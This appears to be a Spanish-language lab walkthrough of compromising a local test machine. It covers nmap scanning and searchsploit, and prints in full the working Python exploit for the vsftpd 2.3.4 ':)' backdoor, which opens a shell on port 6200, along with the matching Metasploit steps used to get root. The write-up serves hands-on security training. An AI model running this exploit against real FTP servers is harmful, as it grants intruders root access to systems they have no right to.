@@ -1,1 +1,97 @@
+29/06/2025 
+
+Después de desplegar la "máquina" vulnerable, se comprobará con un ping si todo está correcto y existe la comunicación. 
+
+$ ping -c1 172.17.0.2 
+
+Si existe una respuesta, es decir, obtenemos el echo-replay ya podremos empezar con el reconocimiento. Ya de esto podemos sacar una conclusión, es que nuestra máquina 
+objetivo no tiene denegado el protocolo ICMP. 
+
+$ nmap -sS -p- -Pn -n 172.17.0.2 -oN fScan 
+
+Obtenemos un único vector de entrada, que es en el puerto 21. El servicio que nos muestra es ftp, pero como el escaneo no muestra suficiente información, volveremos a 
+escanear nuevamente, pero ya teniendo el puerto 21 como objetivo.
+
+$ nmap -sV -sT 172.17.0.2 -oN pScan 
+
+Con este escaneo se obtendrá la siguiente versión: vsftpd 2.3.4, por lo que procederemos a buscar vulnerabilidades si es que existen. Lo primero que haré será buscar
+con searchsploit.
+
+$ searchsploit vsftpd 2.3.4 
+
+Nos devuelve el siguiente script:
+vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
+
+Antes de nada, nos traeremos a nuestro directorio actual con $searchsploit -m unix/remote/49757.py , para analizar este script y ver que hace.
+
+El script .py es el siguiente:
+
+from telnetlib import Telnet
+import argparse
+from signal import signal, SIGINT
+from sys import exit
+
+def handler(signal_received, frame):
+    # Handle any cleanup here
+    print('   [+]Exiting...')
+    exit(0)
+
+signal(SIGINT, handler)
+parser=argparse.ArgumentParser()
+parser.add_argument("host", help="input the address of the vulnerable host", type=str)
+args = parser.parse_args()
+host = args.host
+portFTP = 21 #if necessary edit this line
+
+user="USER nergal:)"
+password="PASS pass"
+
+tn=Telnet(host, portFTP)
+tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
+tn.write(user.encode('ascii') + b"\n")
+tn.read_until(b"password.") #if necessary, edit this line
+tn.write(password.encode('ascii') + b"\n")
+
+tn2=Telnet(host, 6200)
+print('Success, shell opened')
+print('Send `exit` to quit shell')
+tn2.interact()
+
+####
+
+Utiliza la libreria telnetlib para realizar la conexión por telnet. La libreria signal para capturar el control +c y la salida del script. 
+Argparse para los argumentos y system para poder salir del script.
+
+El funcionamiento parece bastante simple. Almacena en variables el puerto a usar, un usuario y la contraseña para posteriormente 
+realizar la conexion. El carácter " :) " es como una especie de trigger, que lo que hace es que la máquina victima, abra el puerto 6200. 
+El cual usaremos para conectarnos por segunda vez con telnet. 
+
+
+Usando msfconsole:
+
+msf6> search vsftpd 2.3.4
+msf6> use 0 
+msf6> show options
+msf6> set rhosts 172.17.0.2 
+msf6> run 
+
+$ whoami 
+
+Si la respuesta es root, es que todo fue correctamente.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
